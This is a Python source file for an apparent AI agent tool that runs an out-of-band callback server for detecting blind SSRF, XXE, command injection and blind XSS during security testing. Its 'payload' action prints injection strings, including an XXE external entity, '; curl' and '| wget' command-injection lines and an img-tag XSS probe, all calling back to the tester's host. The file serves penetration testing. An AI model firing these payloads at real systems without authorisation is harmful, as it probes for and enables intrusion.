import asyncio
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional
from truthzero.tools.base import BaseTool, ToolResult


class OOBHandler(BaseHTTPRequestHandler):
    callbacks = []
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        OOBHandler.callbacks.append({"time": time.time(), "method": "GET", "path": self.path, "headers": dict(self.headers), "ip": self.client_address[0]})
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        OOBHandler.callbacks.append({"time": time.time(), "method": "POST", "path": self.path, "body": body[:1000], "headers": dict(self.headers), "ip": self.client_address[0]})
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    do_PUT = do_POST
    do_DELETE = do_GET
    do_OPTIONS = do_GET


class OOBServerTool(BaseTool):
    name = "oob_server"
    description = "Start/stop an out-of-band callback server for detecting blind SSRF, XXE, RCE. Like Burp Collaborator but local."
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string", "enum": ["start", "stop", "check", "clear", "payload"], "description": "Action"},
            "port": {"type": "integer", "default": 9999},
            "token": {"type": "string", "description": "Unique token for this test"},
        },
        "required": ["action"],
    }

    _server = None
    _thread = None
    _port = 9999

    async def execute(self, action: str = "", port: int = 9999, token: str = "", **kwargs) -> ToolResult:
        if action == "start":
            if self._server:
                return ToolResult(output=f"Already running on port {self._port}", success=True)
            try:
                self._port = port
                OOBHandler.callbacks = []
                self._server = HTTPServer(("0.0.0.0", port), OOBHandler)
                self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
                self._thread.start()
                import socket
                ip = socket.gethostbyname(socket.gethostname())
                output = f"OOB server started on 0.0.0.0:{port}\n"
                output += f"Your IP: {ip}\n\n"
                output += f"Use in payloads:\n"
                output += f"  SSRF: http://{ip}:{port}/ssrf-test\n"
                output += f"  XXE:  http://{ip}:{port}/xxe-test\n"
                output += f"  RCE:  curl http://{ip}:{port}/rce-test\n"
                output += f"  DNS:  (use interact.sh for DNS OOB)\n\n"
                output += f"Check callbacks: /oob check"
                return ToolResult(output=output, success=True)
            except Exception as e:
                return ToolResult(output="", success=False, error=str(e))

        elif action == "stop":
            if self._server:
                self._server.shutdown()
                self._server = None
                self._thread = None
                return ToolResult(output="OOB server stopped.", success=True)
            return ToolResult(output="Not running.", success=True)

        elif action == "check":
            callbacks = list(OOBHandler.callbacks)
            if token:
                callbacks = [c for c in callbacks if token in c.get("path", "")]
            if not callbacks:
                return ToolResult(output="No callbacks received yet.", success=True)
            output = f"{len(callbacks)} callback(s) received:\n\n"
            for cb in callbacks[-20:]:
                t = time.strftime("%H:%M:%S", time.localtime(cb["time"]))
                output += f"  [{t}] {cb['method']} {cb['path']} from {cb['ip']}\n"
                if cb.get("body"):
                    output += f"    Body: {cb['body'][:200]}\n"
            return ToolResult(output=output, success=True)

        elif action == "clear":
            OOBHandler.callbacks.clear()
            return ToolResult(output="Callbacks cleared.", success=True)

        elif action == "payload":
            import socket
            ip = socket.gethostbyname(socket.gethostname())
            port = self._port
            tok = token or f"t{int(time.time()) % 10000}"
            output = f"OOB Payloads (token: {tok}):\n\n"
            output += f"SSRF:\n  http://{ip}:{port}/{tok}\n\n"
            output += f"XXE:\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{ip}:{port}/{tok}\">]><foo>&xxe;</foo>\n\n"
            output += f"RCE:\n  ; curl http://{ip}:{port}/{tok}\n  | wget http://{ip}:{port}/{tok}\n\n"
            output += f"Blind XSS:\n  <img src=http://{ip}:{port}/{tok}>\n\n"
            output += f"Check: oob_server action=check token={tok}"
            return ToolResult(output=output, success=True)

        return ToolResult(output="", success=False, error=f"Unknown action: {action}")
